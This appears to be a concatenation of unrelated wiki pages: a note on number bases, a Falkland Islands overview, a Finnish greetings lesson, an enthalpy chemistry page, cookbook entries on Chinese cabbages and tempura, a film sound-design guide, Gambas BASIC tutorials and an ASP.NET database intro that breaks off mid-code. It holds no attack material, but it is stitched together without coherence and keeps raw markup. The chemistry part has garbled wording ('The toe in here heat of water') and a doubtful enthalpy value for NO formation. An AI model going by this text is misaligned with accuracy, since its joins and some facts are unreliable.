      <text xml:space="preserve">More generally, a number representation could be considered a number &lt;math&gt;b&lt;/math&gt; and a set of numbers &lt;math&gt;D&lt;/math&gt; known as &quot;digits&quot; (of which one is zero). Representation of other numbers in terms of an infinite sequence of digits (almost all of which are zero) then follows as before, i.e., &lt;math&gt;\sum_{j=-\infty}^M d_j b^j,\, d_j\in D&lt;/math&gt;. Obviously, depending on &lt;math&gt;b&lt;/math&gt; and &lt;math&gt;D&lt;/math&gt;, some numbers may be unrepresentable, or there may be numbers which have multiple representations (one or the other is unavoidable once you allow a continuum e.g. the Reals). I merely note this for discussion, because without conversion between &lt;math&gt;b=10,\, D=\{0,1,2,3,4,5,6,7,8,9\}&lt;/math&gt; and something like &lt;math&gt;b=i-1,\, D=\{0,1\}&lt;/math&gt; or &lt;math&gt;b=-2,\, D=\{0, 1, \frac{-1\pm i\sqrt{3}}{2}\}&lt;/math&gt; the information would go nowhere.</text>

[[Image:Falklandsmap.gif|right|225px]]
''Welcome to the Falkland Islands!'' The Falklands (as they are known locally) are a group of islands 300+ miles (500 km) of the coast of South America. The Falklands are a self-governing overseas territory of the United Kingdom of Great Britain and Northern Ireland; they are claimed as part of Argentina by the Argentine constitution. The Falkland Islands Government control their own affairs, such as schools, hospitals and taxes. In the islands is a passage called the Falkland Sound which the islands are named after, which goes through the middle of the islands.

==The Geography==
The Falkland Islands are made up of two main islands and over 750 small islands.The total land area is 4,700 square miles (12,000 km2).Surrounded by cool South Atlantic waters, the Falkland Islands have a climate very much influenced by the ocean. January averages about 9 °C, with average daily high of 13 °C, while July averages about 2 °C with average daily high 4 °C. Rainfall is relatively low at about 24 inches (610 mm). Humidity and winds, however, are constantly high. Snow is rare, but can occur at almost any time of year.

==The people==
Argentines call them the '''''Islas Malvinas'''''. Their claim is due to them being near Argentina and in the past East Falkland islands was sold to Spain by the French.  The Spanish left the Islands in 1811, 5 years before Argentina declared its independence from Spain in 1816.

The main ways in which the islands make money are by fishing in the rich seas around the islands and wool from the sheep which live on the islands. In the past, wool was so important that the flag had a picture of a sheep on it! 

&lt;div style=&quot;float:left; border:1px solid #8888aa; background-color:#ffeedd; font-size:95%; padding:4px&quot;&gt;
'''''The Falklands War'''''
Argentina claims that the islands belong to them. So in 1982, the Argentine government invaded the islands and said they were theirs. The British Government responded by liberating the Islands after 74 days, and sank an Argentine ship called the ''Belgrano''. More than 1000 people were killed, virtually all of them soldiers. &lt;/div&gt;

      <text xml:space="preserve">[[Finnish/Aakkoset|&lt;&lt;Alphabet]] | '''Hello!''' | [[Finnish/Nimet ja kansalaisuudet|What is your name?&gt;&gt;]]

----
The first thing most people expect to say when meeting people is “Hello” or “Hi”. The polite and (very) formal way to greet people is to call them Mr, Mrs or Miss. These forms are used quite rarely in Finnish language.

*Mr. – '''herra'''
*Mrs. – '''rouva'''
*Miss – '''neiti'''

There are several words you can use for &quot;Hello&quot;:

'''Hei''', '''Moi''', and '''Terve'''.

''Hei'' has become semiformal and is more formal than ''Moi'' or ''Terve''. These greetings may also be translated as an informal way of saying &quot;Good bye&quot;.

'''Hei Hei''' - Goodbye

Or you can say:

'''Näkemiin''' or a more informal version '''nähdään''' – Goodbye (literally &quot;we shall see again&quot;). 


You may also wish someone a good day, just as in English: 

'''Hyvää huomenta''' or '''Huomenta''' – &quot;Good morning&quot; or (less formal) &quot;Morning&quot;.

'''Hyvää aamupäivää''' – An alternative greeting used in the morning (literally Good early-day or morning day).

'''Hyvää päivää''' or '''Päivää''' – &quot;Good day&quot; or &quot;Day&quot;. Very common, rather formal greeting.

'''Hyvää iltapäivää''' – &quot;Good afternoon&quot;; not used very commonly.

'''Hyvää iltaa''' or '''Iltaa''' – &quot;Good evening&quot;.



'''Mitä kuuluu?''' or  '''Kuinka voit / voitte?''' (more polite) – How are you?

'''Kiitos, hyvää.''' – Fine, thank you.

'''Ei niin hyvää, kiitos.''' – Not so good, thank you.

== Where are you from? ==
Note that Italy is '''''Italia''''' in Finnish.
Espoo is a city west of Helsinki.

'''Mistä olet kotoisin?''' – Where are you from? 

or (more formal) '''Mistä olette kotoisin?'''

'''Olen (kotoisin)...  -sta/-stä, -lta/-ltä''' – I am from...

* Example: '''Olen (kotoisin) Italiasta''' – I am from Italy.

'''Missä asut?''' – Where do you live?

'''Asun... -ssa/-ssä, -lla/-llä''' – I live in...

* Example: '''Asun Espoossa''' – I live in Espoo.


=== Example Dialog Number One ===

Here is an informal setting between Pekka and his friend Jussi.

*''Pekka:'' '''Hei, Jussi.'''
*''Jussi:'' '''Terve, Pekka.'''


=== Example Dialog Number Two ===

This is a (very) formal setting between Mr Virtanen and Mrs Mäkelä.

*''Herra Virtanen:'' '''Hyvää huomenta, rouva Mäkelä.'''
*''Rouva Mäkelä:'' '''Hyvää päivää, herra Virtanen.'''
*''Herra Virtanen:'' '''Mitä kuuluu?'''
*''Rouva Mäkelä:'' '''Kiitos, hyvää.'''


=== Exercises ===
Fill in the English translations, from memory, for the Finnish phrases below.
You might want to review them first!

Moi:            _____________

Hyvää päivää:    _____________

Päivää:         _____________

Hyvää huomenta: _____________

Mitä kuuluu?:   _____________

Hyvää iltaa!:   _____________

{{SideBox|The absolute enthalpy of a system cannot be measured directly.  However, it is possible to measure changes in enthalpy (&amp;Delta;H) by measuring temperature changes, which represent heat being lost or gained.}}

The enthalpy of a chemical system is the &quot;heat content&quot; of the system—the energy it contains.  Enthalpy is represented by the symbol &lt;math&gt;H&lt;/math&gt;.

== Enthalpy of Reaction ==

All reactions have some amount of enthalpy.  It is simply the amount of heat absorbed or released by the reaction.  Combustion reactions obviously release large amounts of heat.  They have negative enthalpy.  A negative enthalpy represents an exothermic reaction, releasing heat.  A reaction that absorbs heat is endothermic.  Its enthalpy will be positive, and it will cool down its surroundings.

Consider these two reactions:

{| border=&quot;0&quot; cellpadding=&quot;15px&quot;
| &lt;math&gt;3\hbox{C} + 4 \hbox{H}_2 \to \hbox{C}_3\hbox{H}_8 \quad(\Delta H = -104.67\ kJ/mol)&lt;/math&gt;
| This reaction is exothermic (negative enthalpy, release of heat).  When the reaction occurs, the surroundings will increase in temperature due to the gain of heat the system releases.  For every mole of propane (C&lt;sub&gt;3&lt;/sub&gt;H&lt;sub&gt;8&lt;/sub&gt;) formed, 104.67 kilojoules of energy are released.
|-
| &lt;math&gt;\hbox{N}_2 + \hbox{O}_2 \to 2 \hbox{NO} \quad (\Delta H = +756.05\ kJ/mol)&lt;/math&gt;
| This reaction is endothermic (positive enthalpy, absorption of heat).  When the reaction occurs, the surroundings will decrease in temperature due to the loss of heat the system absorbed.  For every mole of NO formed, 756.05 kilojoules of heat are absorbed.  (Note that the reaction shows ''two'' moles being formed, so the enthalpy is double that of ''one'' mole being formed.)
|}

Although every reaction has a change in enthalpy, the amount depends on the temperature.  The same reaction could be endothermic at one temperature and exothermic at another.  Enthalpies must be given at a specific temperature.  The reactions above show the enthalpies at 25 °C.

== Temperature and Heat ==
There is a relationship between temperature and heat.  If an object gains or loses heat ''without'' any phase changes, this reaction relates temperature to heat:

&lt;center&gt;&lt;math&gt;Q = mc\Delta T&lt;/math&gt;&lt;/center&gt;

&lt;math&gt;Q&lt;/math&gt; is the amount of heat (in joules or kilojoules) and &lt;math&gt;\Delta T&lt;/math&gt; is the change in temperature (Celsius degrees).  &lt;math&gt;m&lt;/math&gt; is the mass of the object (in grams, usually) and &lt;math&gt;c&lt;/math&gt; is the object's '''specific heat'''.  

Specific heat is a constant that depends on the particular material of the object.  It is measured in joules per gram-degree.  It is determined experimentally.  You can look it up in a chart, or you can calculate it if you measure the amount of heat added and the change in temperature.  The toe in here heat of water is 4.186 J/g-degree.  For one gram of water, the temperature rises/falls by one degree Celsius for every 4.186 joules of heat added/removed.

{{ingredient}} | [[Cookbook:Basic foodstuffs|Basic foodstuffs]] |  [[Cookbook:Brassicas|Brassicas]]

'''Nappa cabbage''' (also: '''NAPA cabbage''', '''Chinese leaves''', '''Chinese cabbage''', '''Wombok''', '''Baechu''', '''Celery cabbage''', '''Chinese celery cabbage''', '''Peking cabbage''', '''wong bok''', '''petsai''', '''shantung cabbage''', '''hakusia''', '''michihli''' and confusingly sometimes even [[Cookbook:Bok Choy|bok choy]]) is a family of cabbages (''Brassica campestris, Pekinensis group'') used in [[Cookbook:Cuisine of China|Chinese]] and [[Cookbook:Cuisine of Korea|Korean cuisine]]. The cabbage head is tightly packed, taller than it is wide, and very light green with white near the base.
 
The name may be of Japanese origin or may be a Chinese word first exposed to English speakers through Japan.  The Japanese script is: 菜っ葉 for Chinese cabbage, (in Japan, it is a generic term for leaf vegetables.)

Nappa cabbage is commonly used as cheap filler for [[Cookbook:Egg Roll|egg rolls]] (spring rolls), [[Cookbook:Wonton Soup|wontons]], and [[Cookbook:Chow Mein|chow mein]]. It makes for a good vegetable addition to stir fries.  It can be used as a milder and more delicate alternative to green cabbage.  Bok choy, green cabbage or savoy cabbage can be substituted for nappa cabbage but these will have a stronger flavor and take longer to cook. 

It is also the main ingredient in the most popular version of [[Cookbook:Kimchi|kimchi]], although many varieties of kimchi do not require cabbage.

'''Choy sum''' (sometimes known as '''white choy sum''' or more ambiguously as '''Chinese leaves''') is a green leafy vegetable used in [[Cookbook:Cuisine of China|Chinese]] and [[Cookbook:Southeast Asian cuisines|South-east Asian cooking]]. It has firm white stems and dark green leaves. It is actually a member of the [[Cookbook:Cabbage|cabbage]] family (''[[Cookbook:Brassicas|brassica]] chinensis'', or ''[[Cookbook:Brassicas|brassica]] campestris, Chinensis group''). Unlike a conventional western cabbage, the heads are very loose and outward fanning instead of closing in on themselves. 

Choy sum properly refers to a vegetable that has stalks that are about 1&quot; wide with some vertical space between them. Choy sum is sometimes confusingly used to refer to the tender innermost part of any related vegetable.

Both the stems and leaves can be used, but the stems take a little longer to cook (though still very little time). It can be [[Cookbook:Steaming|steamed]] or [[Cookbook:Stir-frying|stir-fried]].

When substitution is required, a mixture of [[Cookbook:Celery|celery]] and [[Cookbook:Spinach|spinach]] will often work well.

Choy Sum is related to:
*[[Cookbook:Bok Choy|bok choy]] - 2&quot;-wide stalks with very little vertical spacing, more bitter, more likely to be damaged due to larger size
*[[Cookbook:Yu Choy|yu choy]] - 0.4&quot;-diameter branching stems, rarely sold, may include flowers
*[[Cookbook:Nappa Cabbage|Chinese cabbage]] - tight head (''Pekinensis'' group), very common

'''Yu choy''' (also '''edible rape''' or '''green chouk uyn jak sum''') is a green leafy vegetable used in [[Cookbook:Cuisine of China|Chinese]] and [[Cookbook:Southeast Asian cuisines|South-east Asian cooking]]. It is mainly 0.4&quot;-diameter green branching stems, with some dark green leaves and yellow flower heads. Yu choy is related to [[Cookbook:Bok Choy|bok choy]] (leaves used) and [[Cookbook:Broccoli|broccoli]] (flower buds used). Yu choy is harvested as the plant bolts, which is when the low-growing plant suddenly shoots up stems to support flowers.

Yu choy can be [[Cookbook:Steaming|steamed]] or [[Cookbook:Stir-frying|stir-fried]].

Yu choy is related to:

*[[Cookbook:Choy Sum|choy sum]] - 1&quot;-wide stalks with some vertical spacing, less bitter, less likely to be damaged due to smaller size
*[[Cookbook:Bok Choy|bok choy]] - 2&quot;-wide stalks with very little vertical spacing, more bitter, more likely to be damaged due to larger size
*[[Cookbook:Nappa Cabbage|Chinese cabbage]] - tight head (''Pekinensis'' group), very common

{{stub}}

The job was originally referred to as &quot;Sound Editor&quot; but when legendary Film Editor [[Walter Murch]] worked for Coppola on Rain People he was not a part of the union so could not use the standard job description and thus coined the term &quot;Sound Design&quot;. &lt;br /&gt;

Since then the two terms have served to identify the distinction between the technical skills needed to work in the audio strand of [[Post-production]] (the editor) and the artistic or academic skills and knowledge used to inform edits (the designer). Thus an editor would be able to employ equipment, such as a mixing desk, while the designer might employ Walter Murch's theory, 'The Color of Sound', to create a well balanced mix.&lt;br /&gt;

In practise, a working professional must be both a competent editor and designer.

==The Importance of Sound==

The sound in a motion picture is composed of dialogue, music and sound effects.  The most important thing that film students must learn is 90% of a motion picture is sound.  The picture is far less important than the sound.  Here is why:

The audience can only look at one picture at a time.  Yet the audience can hear dozens of distinct sounds all at the same time and separate and process all that information... if it is done correctly.  Therefore, much more information can be transmitted from the filmmaker to the audience via sound than via picture.

The goal of a filmmaker is to give the audience as much information as possible.  Too little information and the audience becomes bored.  Example:  If a shot remains on the screen for more than 5 seconds, it becomes boring.  For the younger generation, the average time between cuts is 1.5 seconds where as movies made for an older generation will cut from one picture to the next on an average of once every three seconds.  This is because the eye can examine and process all the information in a frame in about 3 seconds for an adult and 1.5 seconds for teenagers.  So if you are going to have a shot longer than about 5 seconds, you must find some way to convey more information to the audience.  

When a motion picture is delivered to a distributor (specially for distribution overseas), the sound must be on three completely separate tracks.  The dialogue, music and sound effects must be kept separate on the final mix.  But when you are editing a motion picture, you must always look at all the sound together.  If you are doing sound, you cannot ignore the dialogue or the music.  They all tie together.  They all work together.

Here is something else you need to know:

:1.  Sound effects make the scene seem '''real'''.

:2.  Music creates the '''mood''' of the scene.

Another thing you need to know is:

:3.  Sound and music create the '''continuity''' for a motion picture.

When you cut from one shot to another, you always create a discontinuity.  If the sound remains consistent from one shot to the next, continuity is restored.

So let's get started:

==Sound Effects==

There are different types of sound effects.

;1.  Ambience = Background sounds = Atmosphere
:This is the sound in the background.  There are two parts to this.

::A.  One part of ambience is '''room tone'''.  This is the background noise on the movie set.  When you erase dialog or unwanted noise (such as the director yelling, &quot;Cut!&quot;, you must fill the gap with room tone.

::B.  After the scene is edited, a background sound is added from sound recorded in the field.  If you are editing a scene of three men in a cafeteria, you have to go to a cafeteria and record the background sounds from the real cafeteria and put in faintly in the background of the scene.

Many movies do not have background sound.  When you watch &quot;The Sound Of Music&quot; and Maria is singing on the top of a mountain on a green meadow, there is no ambience sound.  This scene sounds as if she is singing in a sterile sound booth... which she is.  If you take that same sound track and add the sound of a meadow in spring, the audience hears both the singing and the meadow separately... and entire scenes sounds much more realistic and inviting.  By not having ambiance, you limit the information that you give the audience.

;2.  Walla
:My favorite sound is walla.  Where else but in motion pictures do you worry about how people mumble faintly in the background?  Walla is indistinguishable voices talking in a murmer.  It seems a bit dorky to record people mumbling but it really is great in scenes of a crowd.  The most annoying thing is I have not found a good sound effects library with walla.

;3.  Pre-Recorded Sound Effects
:For music, using pre-recorded music is frowned upon.  But for sound effects, the fastest and easiest way of getting sound effects is from sound effects libraries.

;4.  Field Recording of Sound Effects
:Eventually, this is where most sound effects for motion pictures come from.  It is not easy to record good, clean sound in the field.

;5.  Foley Sound Effects
:See the separate section on [[Movie_Making_Manual/Foley|Foley]] sound.

===Sound Sweetening===

Sound Sweetening simply means enhancing a sound effect.  This is easy to do if you have the right sound effects program.  All you do is create copies of the sound and apply various sound effects filters (reverb, echo, pitch shifting compression etc.) and then combine them all together until it sounds good.  You might have half a dozen different layers in a single sound effect.  Total trial and error.

===Sound Recording Hardware===

There is no good sound recording device for low-budget filmmakers. Sony's MD (MiniDisc) recorders have strong limitations, because they compress the incoming signal very much like the compression of a mp3 is done. It also could only record in 32 Khz sampling rate. A good alternitive is a DAT-recorder, which can record in 16 Bit and 48 Khz without any compression. Try to record the signal as loud as you can, without overshooting. This will ensure that you have a good signal to noise rate. There are also some hardware recorder on the market, which are able to record 2 channels at once in high quality 24 Bit 48Khz or 96Khz on a memory card. They are the best, you can get for the job, because they get the sounds as clean as possible and without compression. Some have build in microphones, which are quite good, but also allow to connect external microphones with symetric-wireing. The microphone that you use, makes a tremendous difference. Also, with sound effects, you will find that you need a wide selection of microphones since each one is designed for a specific application.

===Sound Software===

There are two kinds of software for sound.

1.  DAW software is multi-track recording software which simulates a digital audio workstation.

2.   Sound editing software is a program which can work with individual sound samples. 

Programs such as iMovie, Final Cut Pro and Final Cut Express include most of the functionality of a multi-track digital audio workstation.  All three programs are useless for working with individual sound samples.  

Long ago, there was a program called &quot;SoundEdit 16&quot; which was easy to use, easy to view, totally bug free, and produced wonderful results.  A few years ago, Apple provides a free copy of BIAS Peak which is not easy to use, not easy to view and rather buggy in my humble opinion ('''r_purser'''-at-'''digipuppet.com''').  There is an upgrade path for a later version but I see little incentive in upgrading a program that they could not get right the first time.  If you purchase an older version of Final Cut Pro, you will still get this program.

Now Apple sells a program called SoundTrack which will slice and dice any sound in a thousand different ways.  However, first look at the program will convince you it is not designed for quick and simple sound effects sweetening.

A fairly simple and effective program for quick sound editing on Windows is Goldwave (http://www.goldwave.com).  It is lightweight, and provides many effects to apply, along with options for volume, panning, and others.  It is even possible to edit a wave on the sample level - you cannot get any more fine-grained.  There is an expression evaluation effect which can be used for generating background hum, white noise, and various other frequencies.  While it does not offer multi-track functionality, it's sister product MultiQuence provides these features.

Audacity (http://audacity.sourceforge.net/) is another, ''totally free'', sound editor for Windows, which provides many of the features of higher-level programs such as Cubase in a more accessible interface.  This program has received many recommendations and good reviews.

'''Tempura''' is one of the fried foods of [[Cookbook:Cuisine of Japan|Japan]]. Various [[Cookbook:Meat|meats]], [[Cookbook:Fish|fish]], and [[Cookbook:Vegetable|vegetables]] are dipped in [[Cookbook:Batter|batter]] and then [[Cookbook:Deep-fat Frying|deep fried]] until lightly golden.

==Ingredients==
* 1 [[Cookbook:egg|egg]]
* 1 [[Cookbook:cup|cup]] ice cold water
* 1 cup all-purpose [[Cookbook:flour|flour]]
* Enough oil to fry food
You may also wish to include 1 tablespoon of corn starch

==Procedure==
# Heat cooking oil (peanut oil is best) in a deep pan to 340 - 350° F (~171 - 176°C)
# Beat the egg in a bowl and add ice cold water (warmer water will produce a sticky batter and more oily tempura).
# Add flour and mix lightly. Do not overmix batter (a few lumps actually improve the result, adding crispiness).
# Dip meat or vegetables briefly in the batter and fry until brown.
# Remove from the oil and drain.
# Serve hot.

If using [[Cookbook:Shrimp|shrimp]], score them a few times crosswise on the underside, to prevent them from curling up during [[Cookbook:Deep-fat Frying|deep frying]]. Alternatively, [[Cookbook:Skewering|skewer]] them before cooking. Remove the skewers before serving.

Serve over white [[Cookbook:Rice|rice]] garnished with black [[Cookbook:Sesame Seed|sesame seeds]], in a bowl of [[Cookbook:Udon |udon noodle soup]], or in a bowl of [[Cookbook:Soba|soba noodle soup]]. Serving in [[Cookbook:Soup|soup]] will make the cooked batter get mushy, of course.

== Usar la Propiedad Time ==
Time returns the current time. Example:

You need 1 button:

 Private Sub Button1_click()
    message(time)
 end


Te daria algo asi: 22:13:00.998 (En ubuntu me da asi :P)

Por ejemplo si queremos hacer que a determinada hora nos avise, seria algo asi:

Necesitas 2 Textbox, 1 Boton, 1 Timer y un modulo..

En textbox1 escribimos la Hora que queremos que nos avise.
En textbox2 escribimos el minuto que queremos que nos avise.

Within the module write:


 PUBLIC Hora as string[]
 PUBLIC Final as string[]

Within form Fmain, Button1 write:

 Private Sub Button1_click()
 dim tiempo as String
 tiempo=Time
   Module1.Hora=Split(tiempo,&quot;:&quot;)
     Timer1.enabled = true
    
 end

 Private Sub Timer1_()
 dim tiempo as string
 Timer1.delay = 500
   tiempo=Time
     Module1.Final=split(tiempo,&quot;:&quot;)
     if Module1.hora[0] =  Module1.Final[0] and Module1.hora[1] = Module1.Final[1] then
             message.info(&quot;Ya es la hora que ingresaste antes&quot;)
             Timer1.enabled = false
     end if
 end

==Wait Command==

The Syntax is 
 WAIT [ Delay ] 

This command calls the event loop. If Delay is specified, it does not return until Delay seconds elapse. 
Delay is a floating point number. So, if you want to wait 100 ms, just do: 
  WAIT 0.1
During the wait, no keyboard or mouse events are processed. Only drawing, timer and file descriptors events, like Process_Write are still running.

Example 

You need a commandbutton and a textbox to get it going.

 PUBLIC SUB Button1_Click()
  WAIT 10
  'waits 10 seconds 
  WAIT 0.1 
  'waits 100 milliseconds 
  textbox1.Text = &quot;&quot;
 END

==Variable Declaration ( Dimensioning) ==

In Gambas it is necessary to declare every variable. To dimension a variable, the code is:

 Dim variablename as type

You can just skip the word Dim , so the following is also correct:

 variablename as type

The variable name could be whatever you want. The type however has to be chosen. You have a choice of integer, string, variant and some others. This tells the computer what type of information the variable holds. Singles and integers hold numbers, while strings hold text. 

 'Dimensioning 
 Dim i as Integer
 Dim x as Variant
 'assignment
 i = 31             'This is ok
 i = &quot;i do&quot;     'Error: type mismatch(i is an integer;&quot;i do&quot; is a string)
 x = 341            'This is ok
 x = &quot;books&quot;        'This is all right

In Gambas you cannot dim an array as you were used in VB. The following is wrong:

     xxxxx  Dim x(1 to 10) as integer  xxxxxx

Dimensioning can also be used to tell the computer that variables are public or private. When a variable is public, it may be used and changed in all sub-programs. To make a variable public you must dim it in the &quot;declarations&quot; area of the code. These declarations are placed on the very first lines in your code, above all sub programs and other code.

Examples: You need a command button on your form to get it going. 

 PUBLIC SUB Button1_Click()
 'Declaration
 x AS integer
 y AS float
 z AS String
 'assignment
 x = 2
 y = 2.378
 z = &quot;That ist correct&quot;
 'the use of variables 
 print x,y,z,x*y
 END

The following program will cause an error: x already declared

 'xxxxxxxxxxxxxxxxxxxx
 PUBLIC SUB Button1_Click()
 DIM x AS integer
 DIM x AS float
 DIM x AS String
 x = 2
 x = 2.378
 y = &quot;That ist not correct&quot;
 print x,x,x
 END
 'xxxxxxxxxxxxxxxxxxxxxx

In the following program you also cause some error warnings, as there is no difference between upcase and lowcase signs in Gambas. 

 PUBLIC SUB Button1_Click()
 DIM x AS integer
 DIM X AS float
 DIM x$ AS String
 x = 2
 X = 2.378
 x$ = &quot;that ist correct &quot;
 print x,X,x$
 END

==List of Gambas predefined datatypes for the declaration of variables==

&lt;tr&gt;&lt;td valign=top style=&quot;border: none; border-left: 1px solid black;&quot;&gt;  &lt;code&gt;Float&lt;/code&gt;  &lt;/td&gt;&lt;td valign=top style=&quot;border: none; border-left: 1px solid black;&quot;&gt;  Like the &lt;em&gt;double&lt;/em&gt; datatype in &lt;em&gt;C&lt;/em&gt;  &lt;/td&gt;&lt;td valign=top style=&quot;border: none; border-left: 1px solid black;&quot;&gt;  8 bytes  &lt;/td&gt;&lt;td valign=top style=&quot;border: none; border-left: 1px solid black;&quot;&gt;  0.0   &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign=top style=&quot;border: none; border-left: 1px solid black;&quot;&gt;  &lt;code&gt;Date&lt;/code&gt;  &lt;/td&gt;&lt;td valign=top style=&quot;border: none; border-left: 1px solid black;&quot;&gt;  Date and time, each stored in an &lt;em&gt;integer&lt;/em&gt; .  &lt;/td&gt;&lt;td valign=top style=&quot;border: none; border-left: 1px solid black;&quot;&gt;  8 bytes  &lt;/td&gt;&lt;td valign=top style=&quot;border: none; border-left: 1px solid black;&quot;&gt;  Null   &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign=top style=&quot;border: none; border-left: 1px solid black;&quot;&gt;  &lt;code&gt;String&lt;/code&gt;  &lt;/td&gt;&lt;td valign=top style=&quot;border: none; border-left: 1px solid black;&quot;&gt;  A reference to a variable length string.  &lt;/td&gt;&lt;td valign=top style=&quot;border: none; border-left: 1px solid black;&quot;&gt;  4 bytes  &lt;/td&gt;&lt;td valign=top style=&quot;border: none; border-left: 1px solid black;&quot;&gt;  Null   &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign=top style=&quot;border: none; border-left: 1px solid black;&quot;&gt;  &lt;code&gt;Variant&lt;/code&gt;  &lt;/td&gt;&lt;td valign=top style=&quot;border: none; border-left: 1px solid black;&quot;&gt;  Any datatype.  &lt;/td&gt;&lt;td valign=top style=&quot;border: none; border-left: 1px solid black;&quot;&gt;  12 bytes  &lt;/td&gt;&lt;td valign=top style=&quot;border: none; border-left: 1px solid black;&quot;&gt;  Null   &lt;/td&gt;&lt;/tr&gt;
&lt;tr&gt;&lt;td valign=top style=&quot;border: none; border-left: 1px solid black;&quot;&gt;  &lt;code&gt;Object&lt;/code&gt;  &lt;/td&gt;&lt;td valign=top style=&quot;border: none; border-left: 1px solid black;&quot;&gt;  A anonymous reference to an object.  &lt;/td&gt;&lt;td valign=top style=&quot;border: none; border-left: 1px solid black;&quot;&gt;  4 bytes  &lt;/td&gt;&lt;td valign=top style=&quot;border: none; border-left: 1px solid black;&quot;&gt;  Null   &lt;/td&gt;&lt;/tr&gt;
&lt;/table&gt;

==Assignment==

Once you have declared a variable , you can assign a value to it.

 Variable = Expression 

This will assign the value of an expression to one of the following elements : 
*A local variable. 
*A function parameter. 
*A global (class) variable. 
*An array slot. 
*An object public variable. 
*An object property. 

Example 

 iVal = 1972
 Name = &quot;Gambas&quot;
 hObject.Property = iVal
 cCollection[sKey] = Name

== Structures ==

Some versions of basic, allow structured variables to be created by using TYPE definitions as follows:

 ' This will not work in gambas
 TYPE rhubarbstructure
   foo AS STRING * 32
   bar AS INTEGER
 END TYPE

 PUBLIC rhubarb AS rhubarbstructure

Currently, gambas does not support the TYPE keyword. However, it is possible to use class definitions for the same effect. 

=== Creating a class ===

From the [[Gambas/IDE | Integrated Development Environment]] file, create a [[Gambas/class | class]] file rhubarbstructure.class as follows:

 PUBLIC foo AS STRING
 PUBLIC bar AS INTEGER



It is now possible to define a variable utilizing that class, by creating an appropriate definition in the code module as follows:

 DIM rhubarb AS rhubarbstructure

==Simple output==
The interaction between the user and the [[computer]] consists of the input and output of data. You wouldn't know what the computer is doing without seeing or hearing anything. That's the importance of output.

===Printing===
Note: The word &quot;printing&quot; here means using the Print statement, it's not about using the printer or printing files.
Printing is a fairly simply part of gambas, but also essential. Most often printing is used to output information to the user, and can also prove a valuable troubleshooting tool. Whenever printing, you need an object, followed by of course, something to print. Printing may be used with various objects, however, the most common in the terminal window.

Example: You need a command button on your form:

 PUBLIC SUB Button1_Click()
     Print &quot;Hello world!!!&quot;      
 END

This example prints a message in the terminal window, not on the current form like in VB 

===Output in Labels, Textlabels, Textboxes oder Textareas===

You can also aim your output to different kind of text controls. 

Example: You need a command button and a textbox on your form:

 PUBLIC SUB Button1_Click()
     Textbox1.text = &quot;Hello world!!!&quot;      
 END

===Message boxes===
One of the easiest way of an output is the message box. This is what the code of a normal message box should look like.

  Message.Info(&quot;Hallo&quot;)

Example:

 PUBLIC SUB Button1_Click()
 Message.Info(&quot;Hallo, this is your message&quot;, &quot;OK&quot;)
 END

===Spacing===
There is various way to alter how text is spaced when printing. The most common is the comma. A comma will go to the next print zone. Print zones are 15 characters long. You can think of it like pressing the tab key when typing something out. Remember that print zones are fixed, so if you've typed 1 letter, and then used a comma, then it will be a big space. If you type 13 characters and use a comma, it will not be a large space. For example:&lt;br&gt;
       Private Sub Form_Click()
              Me.Print &quot;Hello&quot;, &quot;Next Zone&quot;
       End Sub
Several new things are introduced in this example. The subroutine(which is a function that does not return a value; you'll learn more about them later) Form_Click is called when the user clicks on the current Form(Form1). 'Me' is the same as the current form (Form1).
Don't be afraid to experiment. No matter what you do in VB, its always reversible. Now, the comma isn't all that versatile. Another feature is tab. Tab will move so many spaces from the BEGINNING of the line. Followed by tab in parentheses is the amount of characters spaces. For example:
              Form1.Print &quot;Hello&quot;; Tab(10); &quot;Yay&quot;
This will NOT print &quot;yay&quot; 10 spaces after the O of &quot;Hello&quot;. Rather it will print 10 spaces from the beginning of the line. You may use as many tabs as you want in the same print command. Although tab is useful, sometimes it is better to spaces things in relation to what has already been printed. This is where the space function comes in. The syntax of space is identical to that of tab. Space will move the next printed text so many spaces over from its CURRENT location. For example:
      Pic.print &quot;Hello&quot;; Space(10); &quot;Yay&quot;
This will print the first Y of &quot;Yay&quot; 10 spaces to the right of the O in &quot;Hello&quot;. It is important to note, if you write:
     Pic.Print &quot;Hello&quot;
     Pic.Print &quot;Hello&quot;
They will appear on separate lines as:
     Hello
     Hello
This can be easily dealt with in the need of having separate print statements print on the same line. You merely have to change the code to:
    Pic.Print &quot;Hello&quot;;
    Pic.Print &quot;Hello&quot;
This will appear as:
    HelloHello
If you want to make a blank line in between the two hellos, then you may simply have a blank print statement WITHOUT a semicolon. For example:
    Pic.Print &quot;Hello&quot;
    Pic.Print
    Pic.Print &quot;Hello&quot;
This will print as:
    Hello
    
    Hello
It is important to remember that even if the first print has a semicolon at the end, often referred to as a trailing semicolon, the empty print will only reverse it, and print the second Hello on the next line, and no blank line will appear.

== ASP.NET Database ==

ASP.NET v1.1.4322

== Introduction ==

A database is essentially a place to store data.  However the key to understanding the term &quot;database&quot; is that a database is an electronic warehouse for storing data.  Databases can contain any type of data (depending on the manufacturer/vendor).  For example the Wikibooks website is maintained within a database.

There are many types of database.  Hierarchy database, Network database, Relational database, Object database, XML database.  Even a file system or Excel can be considered as a database.

The most common structure for storing the data is as a table. Each row in the table is a record and each column is a field.   The table may relate to other tables by sharing a common field.  This is known as a relational database.

Relational database is the dominant database in the database market today.  There are proprietary ones like Oracle, IBM DB2, Microsoft SQL Server, Sybase, ANTs, and open source ones like PostgreSQL, MySQL, Derby, Berkeley DB (Sleepcat) etc.

There are typically limitations on length and width of database tables.  SQL Server 2005 has an 8K row width limit for example, and many lengths are limited by 32-bit addressing, to at most approximately 4E9 records.  This increases to approximately 1.8E19 records with 64-bit addressing.

The Microsoft .NET framework comes with several namespaces to manage data in databases.  .NET also comes with SQL Server and Oracle native providers.  A native provider will only work with one database product, and uses the native database more efficiently.  There are several generic database classes, however if you are using a database that has a native provider, use it.

Performing database operations is fairly easy in ASP.NET.  Below is a quick sample of how to connect to a database.

== Connecting to a Database ==


'''VB.NET'''
&lt;pre&gt;
Class Page1
    Public Sub Page_Load (byval sender as System.Object, byval eventars as System.EventArgs)
        Dim sqlconn as new SQLConnection(&quot;database connection string&quot;)
        sqlconn.Open()
    End Sub

End Class
&lt;/pre&gt;
'''C#.NET'''
&lt;pre&gt;
public class Page1

{
    public void Page_Load(object sender, EventArgs e)
    {
        string strConn = &quot;''database connection string''&quot;; 
        // the italicized ''database connection string'' above should   
        // be replaced by some real valid one.
